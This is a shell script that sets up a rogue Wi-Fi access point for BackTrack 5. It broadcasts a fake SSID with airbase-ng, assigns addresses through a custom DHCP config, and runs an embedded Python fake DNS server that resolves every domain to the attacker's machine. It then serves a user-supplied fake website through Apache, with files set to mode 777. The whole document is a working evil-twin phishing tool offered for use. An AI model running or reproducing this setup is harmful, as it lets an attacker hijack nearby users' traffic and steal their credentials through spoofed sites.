#!/bin/sh
echo "***********************************";
echo "********  Rogue AP Script  ********";
echo "***********************************";
echo "   "; 
echo " This script should work like a charm in BT5";
echo " But, a deb file is needed for DHCP";
echo "   "; 
echo " Thanks to the Aircrack team !";
echo " Thanks to Francisco Javier Santos for the DNS script";
echo "   ";
echo "***********************************";
echo "***********************************";
echo "   ";
echo "   ";
echo "Enter the fake SSID you want for your (fake) router";
echo "   ";
read ssid



echo "Begining of the installation of the aditionnal packages..."
dpkg -i dhcp3* ;

echo "   ";
echo "   ";
echo "Installation done..."
echo "Now configuring DHCP..."
mv /etc/dhcp3/dhcpd.conf /etc/dhcp3/dhcpd.conf.backup;

echo "   ";
echo "   ";
airmon-ng ;
echo "Enter the name of your interface. Should be Wlan0...";
read interface;
airmon-ng start $interface ;

sleep 4;

echo "   ";
echo "   ";
echo "Airbase for fake WiFi AP on different window"
gnome-terminal -x airbase-ng -v -e $ssid -c 9 mon0 ;

sleep 4;

echo "   ";
echo "   ";
echo "Assingning 192.168.0.1 as the AP ip address"
ifconfig at0 up;
ifconfig at0 192.168.0.1 netmask 255.255.255.0;

echo "   ";
echo "   ";
echo "Changing DHCP3 default config"
echo " option T150 code 150 = string;
one-lease-per-client false;
allow bootp;
ddns-update-style interim;
authoritative;

subnet 192.168.0.0 netmask 255.255.255.0{
interface at0;
range 192.168.0.2 192.168.0.10;
option routers 192.168.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 192.168.0.1;
allow unknown-clients;
}">/etc/dhcp3/dhcpd.conf;

echo "   ";
echo "   ";
echo "... and go for DHCP !"
dhcpd3 -cf /etc/dhcp3/dhcpd.conf ;

sleep 4;

# Au dessus, tout est buen (AP + DHCP) reste DNS

echo "   ";
echo "   ";
echo "Now init the fake DNS..."

echo "
import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
      packet+=self.data[12:]                                         # Original Domain Name Question
      packet+='\xc0\x0c'                                             # Pointer to domain name
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
    return packet

if __name__ == '__main__':
  ip='192.168.0.1'
  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip
  
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))
  
  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()

">/root/Desktop/dns.py;

echo "   ";
echo "   ";
echo "Fake DNS in a new window"
gnome-terminal -x python /root/Desktop/dns.py ;


# Fake Website Init
mkdir /root/Desktop/Fake_Website ;
echo "   ";
echo "Time to put your fake website in /root/Desktop/Fake_Website";
echo "Enter when ready...";
read nope

cp /root/Desktop/Fake_Website/* /var/www/ ;
chmod 777 /var/www/* ;


echo "   ";
echo "   ";
echo "Starting Apache"
apache2ctl start ;

echo "   ";
echo "   ";
echo "Ready tooooooo ruuuuumble"
